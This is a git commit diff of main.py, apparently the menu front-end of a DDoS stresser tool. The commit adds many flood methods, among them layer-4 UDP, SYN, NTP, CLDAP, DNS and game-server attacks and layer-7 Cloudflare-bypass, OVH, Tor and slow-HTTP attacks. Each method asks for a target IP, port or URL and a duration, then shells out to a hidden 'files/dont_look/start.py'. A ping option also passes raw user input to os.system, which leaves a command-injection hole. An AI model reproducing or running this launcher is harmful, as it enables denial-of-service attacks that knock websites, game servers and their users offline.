7616ceb8d26fb2fb309d38d5237096da5d687a8d
404CoderFound <115412664+404CoderFound@users.noreply.github.com>
2023-03-20 17:05:51 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,20 +1,14 @@
 #!/usr/bin/python3
 #coded by $ watermelon
 #smd
-import requests
+#import requests
 import socket
-
 import time
-
-
 import sys
 import ssl
 import datetime
-
 import os
 from os import system
-system("$ watermelon | [2 bots]")
-
 print("""
                _                           _             
               | |                         | |            
@@ -34,7 +28,7 @@ version 1.0                           cod3d by wat3rmelon
 ║                    \___ \| |\/| | |  | |   | |        ║
 ║                    ____) | |  | | |__| |  _| |        ║
 ║                   |_____/|_|  |_|_____/  (_) |        ║
-║                                            /_/        ║                                              ║
+║                                            /_/        ║                                              
 ║                                                       ║
 ║                   $ watermelon#5101                   ║
 ║                                                       ║
@@ -42,6 +36,7 @@ version 1.0                           cod3d by wat3rmelon
 ║                                                       ║
 ║                          layer4                       ║
 ║                          layer7                       ║
+║                          tools                        ║
 ║                                                       ║
 ╚═══════════════════════════════════════════════════════╝
 """)
@@ -55,26 +50,121 @@ if input1 == "layer4":
 ╔═══════════════════════════════════════════════════════╗
 ║                                                       ║
 ║                       Methods:                        ║
-║ UDP, TCP, SYN, CPS, ICPM, CONNECTION, VSE, TS3, FIVEM,║
-║ MEM, NTP, MCBOT, MINECRAFT, MCPE, DNS, CHAR, CLDAP,   ║
-║ ARD, RDP.                                             ║                   
+║ MINECRAFT, CLDAP, VSE, MCPE, NTP, FIVEM, ARD, MEM,    ║
+║ DNS, UDP, SYN, CONNECTION, RDP, TCP, TS3, MCBOT, CPS, ║
+║ CHAR.                                                 ║                   
 ║                                                       ║
 ╚═══════════════════════════════════════════════════════╝""")
 layer4input = input("""
 ╔══════[root@watermelon]
 ╚═══> """)
+if layer4input == "MINECRAFT":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py MINECRAFT " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "CLDAP":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py CLDAP " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "VSE":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py VSE " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "MCPE":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py MCPE " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "NTP":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py NTP " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "FIVEM":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py FIVEM " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "ARD":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py ARD " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "MEM":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py MEM " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "DNS":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py DNS " + ip + ":" + port + " 1000 " + timeudp)
 
 if layer4input == "UDP":
-    ipudp = input(f"ip ══ ")
-    portudp = input(f"port ══ ")
-    timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py UDP " + ipudp + ":" + portudp + " 1000 " + timeudp)
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py UDP " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "SYN":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py SYN " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "CONNECTION":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py CONNECTION " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "RDP":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py RDP " + ip + ":" + port + " 1000 " + timeudp)
 
 if layer4input == "TCP":
     iptcp = input(f"ip ══ ")
     porttcp = input(f"port ══ ")
-    timetcp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py TCP " + iptcp + ":" + porttcp + " 1000 " + timetcp)
+    timeudptcp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py TCP " + iptcp + ":" + porttcp + " 1000 " + timeudptcp)
+
+if layer4input == "TS3":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py TS3 " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "MCBOT":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py MCBOT " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "CPS":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py CPS " + ip + ":" + port + " 1000 " + timeudp)
+
+if layer4input == "CHAR":
+    ip = input(f"ip ══ ")
+    port = input(f"port ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py CHAR " + ip + ":" + port + " 1000 " + timeudp)
 
 #layer7
 if input1 == "layer7":
@@ -82,12 +172,148 @@ if input1 == "layer7":
 ╔═══════════════════════════════════════════════════════╗
 ║                                                       ║
 ║                       Methods:                        ║ 
-║  Get, Post, Ovh, Rhex, Stomp, Stress, Dyn,            ║ 
-║  Downloader, Slow, Head, Null, Cookie, Pps, Even,     ║ 
-║  Gsb, Ddb, Avb, Bot, Apache, Xmlrpc, Cfb, Cfbuam,     ║
-║  Bypass, Bomb, Killer, Tor.                           ║                   
+║  SLOW, DOWNLOADER, BYPASS, DYN, PPS, HEAD, APACHE,    ║
+║  KILLER, CFB, COOKIE, BOMB, EVEN, TOR, DGB, NULL,     ║
+║  OVH, AVB, POST, XMLRPC, GET, CFBUAM, BOT, STRESS, GSB║                                            
 ║                                                       ║
 ╚═══════════════════════════════════════════════════════╝""")
 layer7input = input("""
 ╔══════[root@watermelon]
 ╚═══> """)
+
+if layer7input == "SLOW":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py SLOW " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "DOWNLOADER":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py DOWNLOADER " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+    
+if layer7input == "BYPASS":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py BYPASS " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "DYN":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py DYN " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "PPS":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py PPS " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "HEAD":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py HEAD " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "APACHE":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py APACHE " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "KILLER":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py KILLER " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "CFB":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py CFB " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "COOKIE":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py COOKIE " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "BOMB":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py BOMB " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "EVEN":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py EVEN " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "TOR":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py TOR " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "DGB":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py DGB " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "NULL":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py NULL " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "OVH":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py OVH " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "AVB":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py AVB " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "POST":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py POST " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "XMLRPC":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py XMLRPC " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "GET":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py GET " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "CFBUAM":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py CFBUAM " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "BOT":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py BOT " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "STRESS":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py STRESS " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+if layer7input == "GSB":
+    url = input(f"url ══ ")
+    timeudp = input(f"timeudp ══ ")
+    os.system("cd files/dont_look && python3 start.py GSB " + url + " 0 " + " 1000 " + " no_proxy.txt " + " 61 " + timeudp)
+
+#Tools
+
+if input1 == "tools":
+       print("""  
+╔═══════════════════════════════════════════════════════╗
+║                                                       ║
+║                       Tools:                          ║ 
+║                        PING                           ║                                  
+║                                                       ║
+╚═══════════════════════════════════════════════════════╝""")
+toolsinput = input("""
+╔══════[root@watermelon]
+╚═══> """)
+if toolsinput == "PING":
+    pinginput = input(f"ip ══ ")
+    os.system(f"ping " + pinginput)
